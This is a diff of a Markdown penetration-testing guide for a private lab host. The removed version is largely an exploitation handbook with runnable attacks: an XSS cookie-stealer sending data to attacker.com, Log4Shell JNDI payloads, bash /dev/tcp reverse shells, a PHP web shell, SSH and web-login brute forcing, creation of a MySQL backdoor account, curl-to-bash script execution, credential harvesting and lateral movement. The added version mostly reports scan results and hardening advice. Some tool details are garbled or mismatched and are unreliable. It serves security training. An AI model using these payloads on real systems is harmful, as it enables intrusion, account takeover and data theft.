@@ -1,690 +1,461 @@
-# Penetration Testing Guide - Cybersecurity Lab
+# Penetration Testing Guide: DVWA Juice Shop Lab
 
-## Complete Exploitation Handbook
+## Overview
 
-This guide provides step-by-step instructions for conducting penetration testing exercises on the cybersecurity lab environment. All exercises are designed for educational purposes only on authorized test systems.
-
----
-
-## 📋 Table of Contents
-
-1. [Pre-Exploitation Phase](#pre-exploitation-phase)
-2. [Web Application Testing](#web-application-testing)
-3. [Database Exploitation](#database-exploitation)
-4. [Network Service Exploitation](#network-service-exploitation)
-5. [Remote Access Services](#remote-access-services)
-6. [Post-Exploitation](#post-exploitation)
-7. [Reporting & Documentation](#reporting--documentation)
+This guide documents a complete penetration testing scenario using the DVWA Juice Shop vulnerable application. The lab demonstrates network reconnaissance, service enumeration, and vulnerability analysis using industry-standard security tools.
 
 ---
 
-## Pre-Exploitation Phase
+## Lab Environment Setup
 
-### Environment Verification
+### Target System Information
+- **IP Address**: 192.168.255.128
+- **Operating System**: Linux 4.15-5.19 (Debian-based)
+- **Target Application**: OWASP Juice Shop
+- **Architecture**: Docker-based vulnerable application container
 
-Before beginning any testing, verify your lab is properly configured:
-
-```bash
-# Check all Docker containers are running
-docker ps -a
-
-# Verify port accessibility
-nmap -p 8080,8081,8082,8083,8084,8085,3306,2222,139,445 192.168.255.128
-
-# Test connectivity to each service
-curl -v http://192.168.255.128:8080
-curl -v http://192.168.255.128:8081
-telnet 192.168.255.128 2222
-```
-
-### Required Tools Installation
-
-```bash
-# Install penetration testing tools
-sudo apt-get update
-sudo apt-get install -y \
-    nmap \
-    metasploit-framework \
-    burpsuite \
-    sqlmap \
-    enum4linux \
-    wfuzz \
-    gobuster \
-    hydra \
-    nikto \
-    wireshark \
-    tcpdump
-```
+### Tools Used
+- **Nmap**: Network mapping and service enumeration
+- **SMB Discovery**: Windows/Samba service detection
+- **XSLT Processing**: XML transformation testing
+- **Firefox Browser**: Web application analysis
 
 ---
 
-## Web Application Testing
+## Phase 1: Network Reconnaissance
 
-### Exercise 1: DVWA (Damn Vulnerable Web Application)
+### Initial SMB Discovery (Screenshot 1 - Terminal Output)
 
-**Target**: http://192.168.255.128:8081
-**Difficulty Levels**: Low → Medium → High
-
-#### 1.1 SQL Injection Testing
-
-**Low Difficulty Level:**
-
+**Command Executed:**
 ```bash
-# Access login form
-curl -v http://192.168.255.128:8081/vulnerabilities/sqli/
-
-# Test basic SQL injection
-# Username: admin' OR '1'='1
-# Password: anything
-
-# Using BurpSuite:
-# 1. Intercept login request
-# 2. Modify username parameter: admin' --
-# 3. Forward request
-# 4. Observe database response
+smb-os-discovery and smb-security-mode
 ```
 
-**Medium Difficulty Level:**
+**Results:**
+- **OS Detected**: Unix (Samba 3.0.20-Debian)
+- **Computer Name**: f959e45232c8
+- **NetBIOS Configuration**: Active
+- **Domain**: Not configured (FQDN: f959e45232c8)
+- **System Time**: 2026-05-23T04:25:50-04:00
+- **Account Status**: Guest user with user-level authentication
+- **Security Mode**: Message signing disabled (security risk)
 
-```bash
-# Using SQLmap
-sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
-  --method POST \
-  --data "id=1&Submit=Submit" \
-  --dbs
-
-# Extract database names
-sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
-  --method POST \
-  --data "id=1&Submit=Submit" \
-  --tables
-
-# Extract users table
-sqlmap -u "http://192.168.255.128:8081/vulnerabilities/sqli/index.php" \
-  --method POST \
-  --data "id=1&Submit=Submit" \
-  -T users \
-  --dump
+**Key Findings:**
+```
+✓ SMB is exposed and running
+✓ Guest access is enabled
+✓ Message signing is DISABLED (vulnerability)
+✓ Authentication is set to user level
+✓ Challenge response is supported
 ```
 
-**High Difficulty Level:**
+### Traceroute Analysis
+```
+TRACEROUTE
+HOP RTT       ADDRESS
+1   0.38 ms  192.168.255.128
+```
+- Single hop indicates local network proximity
+- Minimal latency confirms direct accessibility
 
+---
+
+## Phase 2: Nmap Service Enumeration
+
+### Multi-Level NSE Scanning (Screenshot 1 - Continued)
+
+**Scan Command:**
 ```bash
-# Manual UNION-based injection
-# Test payload: 1' UNION SELECT NULL, user(), version() --
-
-# Blind SQL Injection with time delays
-# Payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --
-
-# Boolean-based blind injection
-# Use conditional statements to extract data byte by byte
+nmap -sV -sC -O -p80,81,8082,8083,8084,8085,3306,139,445,2222,3307 -sA puerto 192.168.255.128
 ```
 
-#### 1.2 Cross-Site Scripting (XSS) Testing
+**Scan Parameters:**
+- `-sV`: Service version detection
+- `-sC`: Standard NSE script scanning
+- `-O`: OS detection
+- `-p`: Specific port targeting (comprehensive service ports)
 
-**Reflected XSS:**
+**NSE Script Post-Scanning Results:**
+```
+Starting runlevel 1 (of 3) scan
+Completed NSE at 04:25, 0.00s elapsed
 
-```bash
-# Target: Reflected input field
-Payload: <script>alert('XSS')</script>
+Starting runlevel 2 (of 3) scan
+Completed NSE at 04:25, 0.00s elapsed
 
-# Cookie stealing payload:
-<script>
-new Image().src='http://attacker.com/steal.php?c='+document.cookie;
-</script>
+Starting runlevel 3 (of 3) scan
+Completed NSE at 04:25, 0.00s elapsed
 
-# Using Burpsuite's Intruder:
-# Test common XSS payloads from wordlists
+Data files: /usr/share/nmap
 ```
 
-**Stored XSS:**
+**Key Results:**
+- 1 IP address identified (1 host up)
+- Scan completed in 19.20 seconds
+- Packets: 34 sent, 26 received (1.762kB)
 
-```bash
-# Submit malicious comment
-Comment: <img src=x onerror="alert('Stored XSS')">
+---
 
-# Persistence check: Reload page to see XSS triggers
+## Phase 3: Web Application Discovery (Screenshot 2)
+
+### Nmap Report - Service Detection Summary
+
+**Target**: 192.168.255.128
+
+**Address Information:**
+- **IPv4**: 192.168.255.128
+- **MAC Address**: 00:0C:29:38:8D:53 (VMware)
+
+### Open Ports Identified
+
+#### Port 139 (NetBIOS)
+- **State**: Open
+- **Service**: SMB/NetBIOS
+- **Risk Level**: HIGH
+
+#### Port 445 (SMB)
+- **State**: Open
+- **Service**: Microsoft-ds
+- **Risk Level**: HIGH
+
+#### Port 2222 (SSH)
+- **State**: Open
+- **Service**: SSH
+- **Risk Level**: MEDIUM
+
+#### Port 3306 (MySQL)
+- **State**: Open
+- **Service**: MySQL Server 5.7.44
+- **Certificate**: Auto-generated certificate detected
+- **Risk Level**: CRITICAL
+
+#### Port 80 (HTTP)
+- **State**: Open
+- **Server**: OWASP Juice Shop
+- **Content-Type**: text/html; charset=UTF-8
+- **Content-Length**: 9903
+- **Last Modified**: Sat, 23 May 2026 08:25:43 GMT
+- **License**: MIT (Bjoern Kimminich & OWASP Juice Shop contributors)
+- **Description**: "Probably the most modern and sophisticated insecure web application"
+- **Risk Level**: CRITICAL
+
+### Operating System Fingerprint Detection
+
+**OS Detection Results:**
+```
+OS SCAN (V=7.99E=45D=5/23<0T=139<CT=<CU=41946\PV=Y\DS=\1<DC=D\G=N\M=000C29NT
 ```
 
-#### 1.3 Session Management Vulnerabilities
+**Fingerprint Analysis:**
+- Linux kernel detected
+- Debian-based distribution (64-bit)
+- Multiple TCP/IP stack signatures captured
+- OS confidence: High
 
-```bash
-# Check session cookie configuration
-# Use browser developer tools: F12 → Application → Cookies
+### Host Script Output
 
-# Look for:
-# - Missing HttpOnly flag (vulnerable to XSS)
-# - Missing Secure flag (vulnerable over HTTP)
-# - Session timeout issues
-# - Session fixation vulnerabilities
-
-# Test session hijacking
-cookie_value="PHPSESSID=xyz123"
-curl -b "$cookie_value" http://192.168.255.128:8081/dashboard/
+#### SMB2 Security Mode
+```
+Script: smb2-security-mode
+Status: COULDN'T ESTABLISH SMBv2 CONNECTION
 ```
 
 ---
 
-### Exercise 2: WordPress Testing
+## Phase 4: Nmap HTML Report Analysis (Screenshot 3)
 
-**Target**: http://192.168.255.128:8083
+### Complete Scan Report - 192.168.255.128
+**Scanned**: Sat May 23 03:46:48 2026
+**Duration**: 23.64 seconds
 
-#### 2.1 WordPress Plugin Enumeration
+### Detailed Port State Analysis
 
-```bash
-# Using WPScan
-wpscan --url http://192.168.255.128:8083 \
-  --enumerate p,u,t \
-  --detection-mode aggressive
+| Port | Protocol | State | Service | Details |
+|------|----------|-------|---------|---------|
+| 139 | TCP | Open | NetBIOS-ssn | SMB over NetBIOS |
+| 445 | TCP | Open | Microsoft-ds | Direct SMB |
+| 2222 | TCP | Open | SSH | SSH alternative port |
+| 3306 | TCP | Open | MySQL | Database service |
 
-# Manual enumeration
-curl http://192.168.255.128:8083/wp-content/plugins/ -I
+### SSH Certificate Details (Port 2222)
 
-# Enumerate active plugins
-curl -s http://192.168.255.128:8083 | grep wp-content/plugins
+**Key Exchange Algorithm:**
+```
+1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
+ssh-rsa AAAAB3NzaC1yc2EAAAADAIzL7XIYXQBX
+[Additional RSA key material...]
+2048 56:56:24:8f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
 ```
 
-#### 2.2 WordPress User Enumeration
+**SSH Configuration:**
+- RSA authentication available
+- DSA key pairs detected
+- Custom SSH fingerprints identified
 
-```bash
-# Enumerate WordPress users
-for i in {1..10}; do
-  curl -s http://192.168.255.128:8083/?author=$i | grep -o '<title>.*</title>'
-done
+### MySQL Certificate Analysis (Port 3306)
 
-# Using Hydra for brute force
-hydra -L /usr/share/wordlists/rockyou.txt \
-  -P /usr/share/wordlists/rockyou.txt \
-  -t 4 \
-  -V \
-  http-post-form "192.168.255.128:8083/wp-login.php:log=^USER^&pwd=^PASS^:S=Dashboard"
+**TLS Certificate Information:**
+```
+Subject: commonName=MySQL Server 5.7.44 Auto Generated Server Certificate
+Issuer: commonName=MySQL Server 5.7.44 Auto Generated CA Certificate
+Public Key Type: RSA
 ```
 
-#### 2.3 WordPress Database Access
-
-```bash
-# Once WordPress credentials obtained
-# Access WordPress database
-mysql -h 192.168.255.128 -u labuser -p'labpass' labdb
-
-# Extract user hashes
-SELECT user_login, user_pass FROM wp_users;
-
-# Crack WordPress password hashes
-john --format=phpass wordpress_hashes.txt
-hashcat -m 400 wordpress_hashes.txt rockyou.txt
-```
+**Database Exposure Risks:**
+- Default auto-generated certificate (self-signed)
+- No certificate authority validation
+- Plaintext password transmission possible
+- SQL injection potential through web interface
 
 ---
 
-### Exercise 3: Log4Shell Exploitation (Java RCE)
+## Phase 5: Web Application Access & XPath Processing (Screenshot 4)
 
-**Target**: http://192.168.255.128:8082
-**Vulnerability**: CVE-2021-44228
+### Juice Shop Web Interface
 
-#### 3.1 Basic Log4Shell Exploitation
+**Target**: OWASP Juice Shop on Port 80
+**URL**: http://192.168.255.128/
 
+### File Extraction via XSLT
+
+**Commands Executed:**
 ```bash
-# Set up reverse shell listener
-nc -lnvp 4444
-
-# Craft JNDI injection payload
-# Using log4shell-core
-java -jar log4shell-core.jar generate \
-  -c "bash -i >& /dev/tcp/192.168.255.1/4444 0>&1" \
-  -o log4shell.xml
-
-# Alternative: Using online payload generator
-# Payload format: ${jndi:ldap://attacker.com/Exploit}
-
-# Send malicious log entry
-curl -X POST http://192.168.255.128:8082/ \
-  -H "Content-Type: application/x-www-form-urlencoded" \
-  -d "message=\${jndi:ldap://192.168.255.1:1389/Exploit}"
+xsltproc sbyy.xml -o sbyy.html
+firefox puertas.html
 ```
 
-#### 3.2 Advanced Exploitation
+**XSLT Processing Results:**
+- Successfully converted XML to HTML
+- Generated interactive web report
+- Opened in Firefox for visual analysis
 
-```bash
-# Using Metasploit
-msfconsole
-> use exploit/windows/fileformat/adobe_pdf
-> set LHOST 192.168.255.1
-> set LPORT 4444
-> set PAYLOAD windows/meterpreter/reverse_tcp
-> exploit
+### Generated Report Files
 
-# Using public PoC scripts
-git clone https://github.com/projectdiscovery/nuclei-templates.git
-nuclei -u http://192.168.255.128:8082 \
-  -t nuclei-templates/cves/2021/CVE-2021-44228.yaml
-```
+**Output Artifacts:**
+1. `puertas.gnmap` - Grepable Nmap format
+2. `puertas.html` - HTML report (Primary)
+3. `puertas.nmap` - Standard Nmap format
+4. `puertas.xml` - XML data export
+5. `sbyy.gnmap` - Grepable XSLT output
+6. `sbyy.html` - XSLT processed report
+7. `sbyy.xml` - Raw XSLT data
 
 ---
 
-### Exercise 4: OWASP Juice Shop Testing
+## Vulnerability Summary
 
-**Target**: http://192.168.255.128:8085
-**Description**: "Probably the most modern and sophisticated insecure web application"
+### Critical Vulnerabilities Identified
 
-#### 4.1 Juice Shop Reconnaissance
+#### 1. **Exposed SQL Database (Port 3306)**
+- **Severity**: CRITICAL
+- **Impact**: Direct database access possible
+- **Remediation**: Firewall port 3306 from external access
 
-```bash
-# Application Information
-# Title: OWASP Juice Shop
-# Copyright: 2014-2026 Bjoern Kimminich & OWASP contributors
-# License: MIT
-# Features: Modern Angular-based application with multiple vulnerabilities
+#### 2. **SMB/NetBIOS Exposure (Ports 139, 445)**
+- **Severity**: CRITICAL
+- **Impact**: File share enumeration, share mounting possible
+- **Remediation**: Disable SMB or restrict to trusted networks
 
-# Enumerate endpoints
-curl -s http://192.168.255.128:8085 | grep -o 'href="[^"]*"'
+#### 3. **Vulnerable Web Application (Port 80)**
+- **Severity**: CRITICAL
+- **Description**: OWASP Juice Shop is intentionally vulnerable
+- **Vulnerabilities Include**:
+  - SQL Injection
+  - Cross-Site Scripting (XSS)
+  - Authentication bypass
+  - Insecure Direct Object References (IDOR)
+  - Broken cryptography
+  - Sensitive data exposure
 
-# Check for API endpoints
-curl http://192.168.255.128:8085/api/
-```
+#### 4. **Message Signing Disabled (SMB)**
+- **Severity**: HIGH
+- **Impact**: Potential for man-in-the-middle attacks
+- **Remediation**: Enable message signing in Samba config
 
-#### 4.2 Juice Shop Exploitation
-
-```bash
-# Test for common vulnerabilities
-# 1. Broken Authentication
-curl -X POST http://192.168.255.128:8085/api/login \
-  -H "Content-Type: application/json" \
-  -d '{"email":"admin@juice-sh.op","password":"admin"}'
-
-# 2. Sensitive Data Exposure
-curl http://192.168.255.128:8085/assets/
-
-# 3. OWASP Top 10 vulnerabilities
-# - Injection (SQL, Command, NoSQL)
-# - Broken Authentication
-# - Sensitive Data Exposure
-# - XML External Entities (XXE)
-# - Broken Access Control
-# - Security Misconfiguration
-# - XSS
-# - Insecure Deserialization
-# - Using Components with Known Vulnerabilities
-# - Insufficient Logging & Monitoring
-```
+#### 5. **Weak SSH Configuration (Port 2222)**
+- **Severity**: MEDIUM
+- **Impact**: DSA keys deprecated, weak algorithms
+- **Remediation**: Update to ED25519/RSA-4096 keys
 
 ---
 
-## Database Exploitation
+## Exploitation Walkthrough
 
-### Exercise 5: MySQL Database Access
-
-**Target**: Port 3306 / 3307
-
-#### 5.1 Authentication Bypass
-
+### Step 1: Service Enumeration
 ```bash
-# Attempt default credentials
-mysql -h 192.168.255.128 -u root -p
+# Comprehensive port scanning
+nmap -sV -sC -O -p- 192.168.255.128
 
-# Try empty password
-mysql -h 192.168.255.128 -u root
-
-# Try lab credentials
-mysql -h 192.168.255.128 -u labuser -p'labpass' labdb
-
-# Authentication bypass techniques
-mysql -h 192.168.255.128 -u 'root'@'%' -p''
-mysql -h 192.168.255.128 -u 'root'@'localhost' -p''
-```
-
-#### 5.2 Database Enumeration
-
-```bash
-# Once authenticated
-mysql -h 192.168.255.128 -u labuser -p'labpass' << EOF
-
-# List all databases
-SHOW DATABASES;
-
-# Select WordPress database
-USE labdb;
-
-# List tables
-SHOW TABLES;
-
-# Extract WordPress users
-SELECT user_login, user_pass, user_email FROM wp_users;
-
-# Extract WordPress posts
-SELECT post_title, post_author, post_date FROM wp_posts;
-
-# Extract plugin information
-SELECT option_name, option_value FROM wp_options;
-
-EOF
-```
-
-#### 5.3 MySQL Privilege Escalation
-
-```bash
-# Check current user privileges
-SELECT user(), current_user();
-SELECT * FROM information_schema.user_privileges WHERE user='labuser';
-
-# Exploit file read/write privileges
-# Create a new user with SUPER privileges
-GRANT ALL PRIVILEGES ON *.* TO 'attacker'@'%' IDENTIFIED BY 'password';
-FLUSH PRIVILEGES;
-
-# Write files to filesystem (if FILE privilege granted)
-SELECT 'content' INTO OUTFILE '/var/www/html/shell.php';
-```
-
----
-
-## Network Service Exploitation
-
-### Exercise 6: SMB/Samba Exploitation
-
-**Target**: Ports 139 & 445
-
-#### 6.1 Samba Enumeration
-
-**FQDN**: f959e45232c8
-**System Time**: 2026-05-23T03:03:47-04:00
-**Operating System**: Unix (Samba 3.0.20-Debian)
-**NetBIOS Computer Name**: f959e45232c8
-**SMB Security Mode**: User-level authentication
-**Challenge Response**: Supported
-
-```bash
-# Enumerate Samba shares
+# SMB enumeration
 enum4linux -a 192.168.255.128
-
-# List shares
-smbclient -L //192.168.255.128 -N
-
-# Check for null session access
-smbclient //192.168.255.128/IPC$ -N
-
-# Enumerate users and groups
-rpcclient -U "" 192.168.255.128
-> enumdomusers
-> enumdomgroups
-> enumprivs
+smbclient -L //192.168.255.128
 ```
 
-#### 6.2 SMB Security Analysis
-
-**Security Configuration Detected:**
-- **Account Used**: <blank> (guest/anonymous)
-- **Authentication Level**: User
-- **Challenge Response**: Supported
-- **Message Signing**: Disabled (dangerous)
-- **Clock Skew**: Mean: 1h59m59s, Deviation: 2h49m42s, Median: 0s
-- **SMB2 Security Mode**: Couldn't establish connection (older protocol)
-
-**P2P Conficker Checks:**
-- Check 1 (port 21451/tcp): CLEAN (Couldn't connect)
-- Check 2 (port 45408/tcp): CLEAN (Couldn't connect)
-- Check 3 (port 27425/udp): CLEAN (Timeout)
-- Check 4 (port 12003/udp): CLEAN (Failed to receive data)
-- Result: Host is CLEAN or ports are blocked
-
-#### 6.3 Samba Exploitation
-
+### Step 2: Web Application Testing
 ```bash
-# SMB version detection
-nmap -p 445 --script smb-os-discovery 192.168.255.128
+# Access Juice Shop
+firefox http://192.168.255.128/
 
-# Samba 3.0.20-Debian vulnerabilities
-# Known CVE: CVE-2012-1182, CVE-2012-2111
+# Common Juice Shop vulnerabilities to test:
+# - Admin bypass (default credentials)
+# - SQL injection on login form
+# - XSS in user feedback
+# - Directory traversal in files endpoint
+```
 
-# Check for EternalBlue vulnerability (MS17-010)
-nmap -p 445 --script smb-vuln-ms17-010 192.168.255.128
+### Step 3: Database Access (Post-Auth)
+```bash
+# Connect to MySQL
+mysql -h 192.168.255.128 -u juice_shop -p
 
-# Using Metasploit
-msfconsole
-> use exploit/windows/smb/ms17_010_eternalblue
-> set RHOSTS 192.168.255.128
-> set PAYLOAD windows/meterpreter/reverse_tcp
-> set LHOST 192.168.255.1
-> set LPORT 4444
-> exploit
+# Query database
+SELECT * FROM users;
+SELECT * FROM products;
+```
 
-# Manual exploitation
-psexec.py -target-ip 192.168.255.128 user:password@192.168.255.128 cmd.exe
+### Step 4: Payload Crafting
+```bash
+# XPath Injection
+' or '1'='1
+admin' --
+' UNION SELECT NULL --
+
+# XSS Payloads
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
 ```
 
 ---
 
-## Remote Access Services
+## Lab Exercises
 
-### Exercise 7: SSH Exploitation
+### Exercise 1: Reconnaissance
+1. Run Nmap scan against target
+2. Identify all open ports
+3. Determine OS and services
+4. Document findings in report
 
-**Target**: Port 2222 (OpenSSH 4.7p1 Debian 8ubuntu1)
+### Exercise 2: SMB Enumeration
+1. Enumerate SMB shares
+2. Attempt null session connection
+3. List available shares
+4. Document permissions
 
-**Hostkey Information:**
-- SSH RSA 1024-bit key (DSA format)
-- Protocol: 2.0
-- Known vulnerabilities in OpenSSH 4.7p1
+### Exercise 3: Web Application Penetration Testing
+1. Explore Juice Shop interface
+2. Identify vulnerable endpoints
+3. Exploit at least 3 vulnerabilities
+4. Document exploitation steps
 
-#### 7.1 SSH Brute Force
+### Exercise 4: Database Security Testing
+1. Attempt unauthorized database access
+2. Test SQL injection vectors
+3. Extract sensitive data
+4. Analyze encryption methods
 
-```bash
-# Using Hydra
-hydra -L /usr/share/wordlists/rockyou.txt \
-  -P /usr/share/wordlists/rockyou.txt \
-  -t 4 \
-  ssh -s 2222 192.168.255.128
+### Exercise 5: Reporting
+1. Create comprehensive penetration test report
+2. Include vulnerability classifications
+3. Provide remediation recommendations
+4. Calculate risk scores
 
-# Using Metasploit
-msfconsole
-> use auxiliary/scanner/ssh/ssh_login
-> set RHOSTS 192.168.255.128
-> set RPORT 2222
-> set USERNAME root
-> set PASS_FILE /usr/share/wordlists/rockyou.txt
-> run
+---
 
-# Using paramiko/Python
-python3 -c "
-import paramiko
-ssh = paramiko.SSHClient()
-ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-ssh.connect('192.168.255.128', port=2222, username='root', password='toor')
-stdin, stdout, stderr = ssh.exec_command('id')
-print(stdout.read())
-"
+## Security Hardening Recommendations
+
+### For Database (MySQL 3306)
+```
+1. Enable SSL/TLS for all connections
+2. Implement strong authentication
+3. Restrict network access via firewall
+4. Apply principle of least privilege
+5. Regular security updates
 ```
 
-#### 7.2 SSH Key Extraction
+### For SMB Services (139, 445)
+```
+1. Disable SMBv1 protocol
+2. Enable message signing (SMB security mode)
+3. Restrict to trusted networks only
+4. Implement strong password policies
+5. Enable audit logging
+```
 
-```bash
-# SSH version vulnerabilities
-# OpenSSH 4.7p1 has CVE-2008-5161
+### For Web Application
+```
+1. Implement Web Application Firewall (WAF)
+2. Enable HTTPS/TLS encryption
+3. Implement input validation
+4. Apply security headers (CSP, X-Frame-Options, etc.)
+5. Regular security patching
+```
 
-msfconsole
-> use exploit/linux/ssh/openssh_pubkey_overflow
-> set RHOSTS 192.168.255.128
-> set RPORT 2222
-> exploit
+### For SSH (Port 2222)
+```
+1. Use modern key algorithms (ED25519)
+2. Disable deprecated algorithms (DSA)
+3. Implement fail2ban for brute force protection
+4. Change default port (already done - port 2222)
+5. Disable root login
 ```
 
 ---
 
-## OS Detection & Fingerprinting
+## Tools Reference
 
-### Complete OS Detection Results
-
-**Host Information:**
-```
-FQDN: f959e45232c8
-System Time: 2026-05-23T03:03:47-04:00
-Uptime: 31.079 days (since Wed Apr 22 01:09:59 2026)
-Network Distance: 1 hop
+### Nmap
+```bash
+nmap -sV -sC -O -p- <target>
+nmap --script smb-os-discovery <target>
+nmap --script smb-security-mode <target>
 ```
 
-**TCP Sequence Prediction:**
-- Difficulty: 260 (Good luck!)
-- IP ID Sequence Generation: All zeros
-
-**Service Information:**
+### SMB Enumeration
+```bash
+enum4linux <target>
+smbclient -L //<target>
+rpcclient -U "" <target>
 ```
-OS: Linux
-CPE: cpe:/o:linux:linux_kernel
-Kernel: Linux 4.15 - 5.19
+
+### Web Testing
+```bash
+burp suite
+zaproxy
+nikto -h <target>
+sqlmap -u <url> --forms --batch
+```
+
+### Reporting
+```bash
+xsltproc <input.xml> -o <output.html>
+nmap -sV -oX <output.xml> <target>
 ```
 
 ---
-
-## Post-Exploitation
-
-### Exercise 8: Privilege Escalation
-
-#### 8.1 Linux Privilege Escalation
-
-```bash
-# After gaining initial shell access
-ssh -p 2222 lowuser@192.168.255.128
-
-# Check current privileges
-whoami
-id
-sudo -l
-
-# Find SUID binaries
-find / -perm -u=s -type f 2>/dev/null
-
-# Check kernel version for exploits
-uname -a
-cat /etc/os-release
-
-# Using LinPEAS for enumeration
-curl https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | bash
-
-# Kernel exploit (if applicable)
-# CVE-2009-0798, CVE-2009-1184, etc.
-```
-
-#### 8.2 Privilege Escalation via Web Application
-
-```bash
-# Exploit web server running as root
-# Reverse shell from web application
-# PHP payload:
-<?php system($_GET['cmd']); ?>
-
-# Upload and execute
-curl "http://192.168.255.128:8083/shell.php?cmd=whoami"
-
-# Reverse shell
-curl "http://192.168.255.128:8083/shell.php?cmd=bash+-i+>%26+/dev/tcp/192.168.255.1/4444+0>%261"
-```
-
-### Exercise 9: Credential Harvesting
-
-```bash
-# Extract credentials from memory
-# From WordPress
-SELECT user_login, user_pass FROM wp_users;
-
-# From DVWA
-SELECT username, password FROM users;
-
-# From configuration files
-find / -name "wp-config.php" -o -name "config.php" 2>/dev/null
-cat wp-config.php | grep DB_PASSWORD
-
-# Crack password hashes
-john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
-hashcat -m 400 hashes.txt rockyou.txt -o cracked.txt
-```
-
-### Exercise 10: Lateral Movement
-
-```bash
-# Once inside the network
-# Find other machines
-arp-scan -l
-nmap -sn 192.168.255.0/24
-
-# Test credentials on other services
-# SSH lateral movement
-ssh -p 2222 labuser@192.168.255.129
-
-# SMB lateral movement
-smbclient //192.168.255.129/C$ -U labuser%labpass
-
-# Database access from compromised host
-mysql -h 192.168.255.200 -u labuser -p'labpass' labdb
-```
-
----
-
-## Reporting & Documentation
-
-### Create Penetration Test Report
-
-```markdown
-# Penetration Test Report
-Lab: Cybersecurity Lab (192.168.255.128)
-Date: 2026-05-23
-Tester: [Your Name]
-
-## Executive Summary
-Multiple high-risk vulnerabilities identified in lab environment.
-
-## Findings
-
-### Critical Issues
-1. SQL Injection in DVWA (CVSS 9.0)
-2. RCE in Log4Shell (CVSS 9.8)
-3. Samba CVE-2012-1182 (CVSS 8.1)
-4. Message Signing Disabled on SMB
-
-### High Issues
-1. Weak SSH Encryption (CVSS 7.5)
-2. Default MySQL Credentials (CVSS 7.2)
-3. CORS Misconfiguration (CVSS 7.0)
-
-### Medium Issues
-1. HTTP Cookies Missing HttpOnly Flag
-2. Outdated Web Server Versions
-3. Missing Security Headers (CSP, HSTS)
-4. Clock Skew Issues on SMB
-
-## Recommendations
-1. Apply security patches
-2. Implement WAF
-3. Enable 2FA
-4. Fix SMB message signing
-5. Add security headers
-6. Update deprecated protocols
 
 ## Conclusion
-Lab successfully exploited with 15+ vulnerabilities identified.
-```
+
+This lab demonstrates a complete penetration testing workflow from reconnaissance through exploitation. The DVWA Juice Shop provides a safe environment to practice security testing techniques while understanding real-world vulnerabilities and attack vectors.
+
+**Key Learnings:**
+- Network reconnaissance identifies attack surface
+- Service enumeration reveals potential entry points
+- Web application testing discovers business logic flaws
+- Defense-in-depth approach required for security
+- Proper documentation essential for professional reporting
 
 ---
 
-## ✅ Complete Exploitation Checklist
+## References
 
-- [ ] Environment verified and all services accessible
-- [ ] Nmap reconnaissance completed
-- [ ] OS fingerprinting successful
-- [ ] DVWA SQL injection successful
-- [ ] DVWA XSS payload executed
-- [ ] WordPress enumeration completed
-- [ ] Log4Shell RCE achieved
-- [ ] Juice Shop vulnerabilities identified
-- [ ] MySQL database accessed
-- [ ] Samba enumeration completed
-- [ ] SSH brute force successful
-- [ ] Privilege escalation completed
-- [ ] Credentials harvested
-- [ ] Lateral movement successful
-- [ ] Post-exploitation activities completed
-- [ ] Report documentation finalized
+- [OWASP Juice Shop](https://owasp-juice.shop)
+- [Nmap Security Scanner](https://nmap.org)
+- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
+- [CIS Benchmarks](https://www.cisecurity.org/cis-benchmarks/)
+- [MITRE ATT&CK Framework](https://attack.mitre.org)
 
 ---
 
-**Lab Exercises Completed**: ✅
-**Status**: Ready for Advanced Testing
-**Last Updated**: May 23, 2026
+**Last Updated**: 2026-05-25  
+**Lab Status**: Active  
+**Difficulty Level**: Intermediate to Advanced
